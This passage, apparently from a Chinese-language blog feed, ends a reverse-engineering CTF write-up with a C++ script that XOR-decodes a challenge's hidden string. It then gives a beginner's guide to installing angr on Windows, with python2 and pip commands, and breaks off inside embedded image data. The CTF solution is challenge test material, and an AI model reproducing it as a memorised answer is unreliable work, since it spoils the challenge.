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
ExFCpIjssqigQDs766Ik+ISQRdGALiFEFhRcCCGyiCy4ZGWp3W6P00mXRYSQRUQWXLiELDk5TTSs
SwgJj1IuEEJkQWMuhBBZUHAhhMhC3uBitTpycppmZlyy7oUQkoKo50IIkQUFF0KILGRZztVqdej1
Ju52GGEKtX9hpAuqEUKWnPj3XNxuZseOUy+/XMay9WNjB7jMUlar49FHf/7rXz/DFf7oRwODg9fj
vmtCSOqIf3AZHp5dvVq5d2+hf2Ff38TXvvY5bkUxnU7zxBMbJyaiWTSaELJU0JgLIUQW8Q8uWVlq
h+PTkZGPGMZ78OA5bpClrCzvD3/4E3cpZLU63n77al7eurjvmhCSOuI/oKvTaX74w4dLS9sBHDlS
duPGTa7w1KndXKFKpXjnnXJadJmQ5Y3mFhFCZEFjLoQQWVBwIYTIgoILIUQWFFwIIbKg4EIIkUXy
gwt3O4zociVVVWaT6VLimySd1+s9d+6cx+NrvNXqeOihN0KtvpL6RxTm5ZBb+FNHlpxkfhXNMN6d
Ozu/8hVNWhrWr1/9q19dGRqqECY6Njdbzp27FmaBR5vN1tHRwT1WqVTV1dVqtdpsNt9zzz2bN28W
tvnggw/Ky8sdDofJZOKigMFg2Lx5M8Mwra2tTqcTgEKhKC8vz83NFa1TdO9er7ezs1Oj0QBYvXr1
lStXKioqVCoVgKoq89SUM7jlix4RAIcDJhM8HigUKC9Hbm74UxiB5mZLbW1PmCmj4V8O6SwW9PTA
YMDmyKemhjp1wfr7bQbDL+J4w5R8Z/7OxSbbsWPDQENtbY9/4diYPTv76PS0M8wTJyYmWlpabt26
xbLs8PDwSy+95HQ6u7u7e3p6/Lfp6OjweDxNTU0jIyMsy9rt9p/85CeTk5Mej+f48eOTk5Pc07mq
ROsM04bh4eGGhgb/PbIs63J58vOPDwxMRnpEt2+zv/wly+1weJhtaWFv3QqzOetyeQoLW8LXyenr
m8jLa96y5fUTJ0bCbyn6ckg3McE2N7Ovv86O+O1HtJ2hCoNPXTCP5/YTT/yyt3dcrzc5nWHPkTSR
nnkiRTIvixjG+9hjJ//rv/584MAD69Z9prCwVegSNzUNPflkQXa2eK8h2P333/+FL3xhaGgoMzMz
+K8ffvihRqPhujMajWbjxo1Xr1713yAvL8/j8fhf3fjXKbpHr9d78uTJP//5zw888MBnPvOZ1tZW
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'/></p>
<p>果然是解码算法，<strong>a2</strong>就是堆栈空间地址，<strong>v2</strong>的值为<code>0xDDCCAABB</code>, 该算法将堆栈内的数据<strong>每八个为一组</strong>和<strong>v2做异或运</strong>算后以字符串输出<br>写出脚本</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">9</span>]=&#123;<span class="number">0xBCA0CCBB</span>,<span class="number">0xB8BED1DC</span>,<span class="number">0xAEBECFCD</span>,<span class="number">0x82ABC4D2</span>,<span class="number">0xB393D9D2</span>,<span class="number">0xA993DED4</span>,<span class="number">0x82B8CBD3</span>,<span class="number">0xB9BECBD3</span>,<span class="number">0xDDCCD79A</span>&#125;,b=<span class="number">0xDDCCAABB</span>;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span> d;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;<span class="number">9</span>;n++)</span><br><span class="line">    &#123;</span><br><span class="line">        c=a[n]^b;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">        d=(<span class="keyword">char</span>)(c%<span class="number">256</span>);</span><br><span class="line">        cout&lt;&lt;d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(c/=<span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr的windows安装——萌新向</title>
    <url>/2019/04/20/angr%E7%9A%84windows%E5%AE%89%E8%A3%85%E2%80%94%E2%80%94%E8%90%8C%E6%96%B0%E5%90%91/</url>
    <content><![CDATA[<p><strong>window10中符号执行（angr）的安装——小白篇</strong></p>
<p>最近做题的时候遇到了一些需要使用angr来完成的题目，之后在网上搜了好久发现大多是Linux以及其它系统的angr安装教程。windows系统的安装方法几乎没有。身为一个萌新，猜测同类们应该也会有需要的时候，虽然Linux和centos系统的教程都很完备随便就能找到，但是应该有不少小萌新和我一样不想讨厌一用工具就要去打开虚拟机。于是就来分享一下我在windows10上装angr的小小经验：<br>一、py问题<br>先检查一下自己的<strong>python2.x</strong>有没有问题（一般都没问题）。关键在于很多萌新同时在电脑里安装<strong>python2</strong>和<strong>python3</strong>时都只顾着看自己的俩个版本的<code>python</code>是不是都装上去了、都设置了环境变量，然后，没有注意自己的<code>python</code>以及<code>pip</code>的使用问题：<br>打开命令提示符，输入：</p>
<pre><code>python
</code></pre><p>或</p>
<pre><code>python2
</code></pre><p>查看此时调用的<strong>py环境是2还是3</strong>，如果是<strong>python3.x</strong>，请检查自己的环境变量是否设置好了（<strong>注意：python2和python3同时安装时在设置好环境变量后需要重启系统才能调用python2，原谅我只是个萌新不能解释原因</strong>）。<code>python</code>的调用没有问题的话再去看<code>pip</code>；方法一致，命令提示符中输入：</p>
<pre><code>pip -V
</code></pre><p>可查看pip所调用的版本信息，倘若是<strong>python3.x</strong>所带的<code>pip</code>请再输入</p>
<pre><code>pip2 -V
</code></pre><p>倘若<code>pip2 -V</code>不能使用则需要手动去安装设置python2的pip<br><em><a href="https://www.cnblogs.com/zhengyihan1216/p/6011640.html">点此通往大佬教程</a></em></p>
<p>二、<strong>安装angr</strong><br>确保可以直接使用python2的pip后打开命令提示符，用以下代码进行安装：<br>(用python2的pip，这里我的pip是直接调用python2的pip，一些人可能要用’pip2’，下面几行代码不再解释)</p>
<pre><code>pip install pyvex
pip install unicorn
pip install simuvex
pip install angr 
</code></pre><p> 之后进入<strong>python2</strong>环境尝试，像下面这样就是成功了</p>
<p><img src='data:img/jpg;base64,iVBORw0KGgoAAAANSUhEUgAAAtUAAACSCAYAAACKcTaWAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAP+lSURBVHhe7F0FoBZF1z730t2NhF2IIoIIKqJi
i4F0iooBKgYodmMhNiYlKSYhjWAg3d3d3Xn/85yZMzu7971wUb7vV7997p3dec6cmN19752z8867
b1K2M6qkHNm9jQ5tWUNACv8QJcmPqYNhI1soGFgaBoSegk8B8cECp6JO0nAqlDcptj2hPopyBnSE
